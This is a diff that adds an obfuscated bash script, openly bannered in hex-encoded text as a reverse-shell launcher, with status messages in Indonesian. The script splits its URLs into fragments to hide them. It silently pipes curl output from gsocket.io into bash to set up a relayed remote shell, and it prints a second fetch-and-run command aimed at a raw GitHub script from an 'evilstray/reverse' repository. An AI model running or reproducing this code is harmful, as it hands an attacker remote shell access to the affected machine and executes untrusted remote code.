@@ -1,0 +1,24 @@
+B=$'\x1b[0;34m';N=$'\x1b[0m'
+echo -e "${B}\x23\x23\x20\x52\x45\x56\x45\x52\x53\x45\x20\x53\x48\x45\x4c\x4c\x20\x45\x58\x45\x43\x20\x23\x23\n\x23\x23\x20\x41\x75\x74\x68\x6f\x72\x20\x3a\x20\x40\x6d\x65\x6b\x69\x68\x75\x6e\x74\x65\x72\x20\x23\x23${N}"
+
+p1="htt";p2="ps";p3="gs";p4="ock";p5="et";p6=".io";p7="/x"
+gx="${p1}${p2}://${p3}${p4}${p5}${p6}${p7}"
+
+r1="raw";r2="github";r3="usercontent";r4="com"
+r5="evilstray";r6="reverse";r7="heads";r8="main";r9="dx"
+rx="${p1}${p2}://${r1}.${r2}${r3}.${r4}/${r5}/${r6}/refs/${r7}/${r8}/${r9}"
+
+_c="curl"; _f="-fsSL"
+
+[ -z "$API" ] || {
+  n="mekihunter_${API}"
+  eval "X=\"\$n\" bash -c \"\$($_c \$_f \$gx)\"" >/dev/null 2>&1
+  echo -e $'\x53\x69\x6c\x61\x68\x6b\x61\x6e\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x20\x70\x61\x64\x61\x20\x56\x50\x53\x20\x41\x6e\x64\x61\x20\x3a'
+  echo "FROM_API=\"\$API\" bash -c \"\$($_c \$_f \$rx)\""
+}
+
+[ -z "$FROM_API" ] || {
+  s="mekihunter_${FROM_API}"
+  eval "S=\"\$s\" bash -c \"\$($_c \$_f \$gx)\""
+  echo -e $'\x42\x65\x72\x68\x61\x73\x69\x6c\x3a\x20\x54\x65\x72\x68\x75\x62\x75\x6e\x67\x20\x6b\x65\x20\x73\x68\x65\x6c\x6c\x21'
+}
